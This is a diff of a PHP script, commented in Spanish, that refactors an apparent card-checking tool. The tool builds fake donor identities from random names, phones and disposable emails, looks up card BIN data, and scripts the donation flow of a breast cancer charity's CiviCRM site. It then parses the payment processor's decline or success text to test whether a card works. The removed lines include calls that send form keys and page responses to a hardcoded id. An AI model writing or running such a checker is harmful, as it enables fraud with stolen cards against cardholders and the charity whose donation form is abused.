@@ -943,52 +943,60 @@ $BinData = BinData($bin); //Extrae los datos del bin
 
 
 ///generador de nombres///
-$names = array(
-    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
-);
+$names = ['Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'];
+$lastNames = ['García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'];
 
-// Apellidos
-$lastNames = array(
-    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
-);
-
-// Números de teléfono
 function generatePhoneNumber() {
-    $areaCode = rand(200, 999);
-    $prefix = rand(200, 999);
-    $lineNumber = rand(1000, 9999);
-    return "($areaCode) $prefix-$lineNumber";
+    return sprintf("(%d) %d-%04d", rand(200,999), rand(200,999), rand(1000,9999));
 }
 
-// Generar datos
+function simpleCurl($url, $postFields = null, $cookie = true, $headers = []) {
+    $defaultHeaders = [
+        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+        'Accept-Encoding: gzip, deflate, br, zstd',
+        'cache-control: max-age=0',
+        'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-platform: "Android"',
+        'upgrade-insecure-requests: 1',
+        'sec-gpc: 1',
+        'accept-language: es-US,es;q=0.5',
+        'priority: u=0, i'
+    ];
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => $postFields ? 'POST' : 'GET',
+        CURLOPT_HTTPHEADER => array_merge($defaultHeaders, $headers)
+    ]);
+    if ($cookie) {
+        curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+        curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    }
+    if ($postFields) curl_setopt($curl, CURLOPT_POSTFIELDS, $postFields);
+    $response = curl_exec($curl);
+    curl_close($curl);
+    return $response;
+}
+
 $name = $names[array_rand($names)];
 $last = $lastNames[array_rand($lastNames)];
 $phone = generatePhoneNumber();
+echo "Nombre: $name $last\nTeléfono: $phone\n";
 
-// Imprimir datos
-echo "Nombre: $name $last\n";
-echo "Teléfono: $phone\n";
-
-
-//Generador de correos///
+// Email generator
 $response = file_get_contents('https://www.fakemailgenerator.com');
-preg_match('/value="([^"]+)"/', $response, $matches);
-$GmailUser = $matches[1];
-//---------------------------//
-// Extraer el valor del dominio
-preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
-$dominio = trim($matches[1]);
-// Eliminar espacios en blanco
-//---------------------------//
-$usr = str_replace("@", "", $dominio);
-//---------------------------//
-$email = "$GmailUser$dominio";
+preg_match('/value="([^"]+)"/', $response, $user);
+preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $domain);
+$email = "{$user[1]}{$domain[1]}";
 echo "$email\n";
 
-
-
-
-
+// Bin lookup
 $curl = curl_init('https://binlist.io/lookup/'.$bin.'');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
@@ -1006,67 +1014,17 @@ echo "$MV\n";
 
 
 
+// First page: get qfKey and MAX_FILE_SIZE
+$response = simpleCurl('https://breastcancereducation.org/make-a-donation');
+preg_match('/<input name="qfKey" type="hidden" value="([^"]+)"/', $response, $qfKey);
+preg_match('/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/', $response, $maxFile);
+$qfKey = $qfKey[1];
+$MAX_FILE_SIZE = $maxFile[1];
+echo "qfKey: $qfKey\nMAX_FILE_SIZE: $MAX_FILE_SIZE\n-------------------------------\n";
 
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/make-a-donation',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  //CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'cache-control: max-age=0',
-    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    'sec-ch-ua-mobile: ?1',
-    'sec-ch-ua-platform: "Android"',
-    'upgrade-insecure-requests: 1',
-    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: none',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-user: ?1',
-    'sec-fetch-dest: document',
-    'priority: u=0, i',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-$patron_qfKey = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
-$patron_MAX_FILE_SIZE = '/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/';
-preg_match($patron_qfKey, $response, $coincidencias_qfKey);
-preg_match($patron_MAX_FILE_SIZE, $response, $coincidencias_MAX_FILE_SIZE);
-
-$qfKey = $coincidencias_qfKey[1];
-$MAX_FILE_SIZE = $coincidencias_MAX_FILE_SIZE[1];
-curl_close($curl);
-
-echo "qfKey: $qfKey\n";
-echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
-echo "-------------------------------\n";
-$myid = "1292171163";
-sendPv($myid, $qfKey);
-
-
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => [
+// Submit donation form
+simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact', [
     'qfKey' => ''.$qfKey.'',
     'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
     'hidden_processor' => '1',
@@ -1101,197 +1059,33 @@ curl_setopt_array($curl, [
     'billing_state_province_id-5' => '1031',
     'billing_postal_code-5' => '10080',
     '_qf_Main_upload' => '1',
-  ],
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'cache-control: max-age=0',
-    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    'sec-ch-ua-mobile: ?1',
-    'sec-ch-ua-platform: "Android"',
-    'origin: https://breastcancereducation.org',
-    'upgrade-insecure-requests: 1',
-    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: same-origin',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-user: ?1',
-    'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/make-a-donation',
-    'priority: u=0, i',
-  ],
 ]);
 
-$response = curl_exec($curl);
-$err = curl_error($curl);
-//file_put_contents('/sdcard/index.html', $response);
-curl_close($curl);
-
-if ($err) {
-  echo 'cURL Error #:' . $err;
-} else {
-  echo $response;
-}
-
-
-
-
-
-$curl = curl_init();
-
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  //CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'cache-control: max-age=0',
-    'upgrade-insecure-requests: 1',
-    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: same-origin',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-user: ?1',
-    'sec-fetch-dest: document',
-    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    'sec-ch-ua-mobile: ?1',
-    'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/make-a-donation',
-    'priority: u=0, i',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-$patron = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
-preg_match($patron, $response, $coincidencias);
-$qfKey2 = $coincidencias[1];
-curl_close($curl);
-
+// Confirm page
+$response = simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey);
+preg_match('/<input name="qfKey" type="hidden" value="([^"]+)"/', $response, $qfKey2);
+$qfKey2 = $qfKey2[1];
 echo "qfKey: $qfKey2\n";
-$myid = "1292171163";
-sendPv($myid, $qfKey2);
 
+// Confirm donation
+simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact', 'qfKey='.$qfKey.'&_qf_default=Confirm:next&_qf_Confirm_next=1');
 
+// Final page
+$response = simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey);
 
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey.'&_qf_default=Confirm:next&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'Content-Type: application/x-www-form-urlencoded',
-    'cache-control: max-age=0',
-    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    'sec-ch-ua-mobile: ?1',
-    'sec-ch-ua-platform: "Android"',
-    'origin: https://breastcancereducation.org',
-    'upgrade-insecure-requests: 1',
-    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: same-origin',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-user: ?1',
-    'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
-    'priority: u=0, i',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-
-curl_close($curl);
-
-
-
-
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey.'',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
-    'cache-control: max-age=0',
-    'upgrade-insecure-requests: 1',
-    'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: same-origin',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-user: ?1',
-    'sec-fetch-dest: document',
-    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    'sec-ch-ua-mobile: ?1',
-    'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
-    'priority: u=0, i',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-$myid = "1292171163";
-sendPv($myid, $response);
-
-$patron = '/<span class="msg-text">(.*?)<\/span>/';
-preg_match($patron, $response, $coincidencias);
-$mensaje1 = $coincidencias[1];
-echo "Me1: $mensaje1\n";
-
-if (!empty($mensaje1)){
-$patron = '/Payment Processor Error message :\d*\s*(.*)/';
-preg_match($patron, $mensaje1, $coincidencias);
-$mensaje = trim($coincidencias[1]);
-echo "Me2: $mensaje\n";
-
-} else {
-$patron = '/<li>(.*?)<\/li>/';
-preg_match($patron, $response, $coincidencias);
-$mensaje = $coincidencias[1];
-echo "Me3: $mensaje\n";
+if (preg_match('/<span class="msg-text">(.*?)<\/span>/', $response, $msg1)) {
+    if (preg_match('/Payment Processor Error message :\d*\s*(.*)/', $msg1[1], $msg2)) {
+        $mensaje = trim($msg2[1]);
+    } else {
+        $mensaje = $msg1[1];
+    }
+} elseif (preg_match('/<li>(.*?)<\/li>/', $response, $msg3)) {
+    $mensaje = $msg3[1];
+} elseif (preg_match('/Your contribution has been submitted to Credit Card for processing/', $response)) {
+    $mensaje = 'Your contribution has been submitted to Credit Card for processing';
 }
-
-if (empty($mensaje)){
-preg_match('/Your contribution has been submitted to Credit Card for processing/', $response, $match);
-$mensaje =  $match[0];
-echo "Me5: $mensaje\n";
-}
-
-$respo = "$mensaje";
-	
-curl_close($curl);
+echo "Mensaje final: $mensaje\n";
+$respo = $mensaje;	
 
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
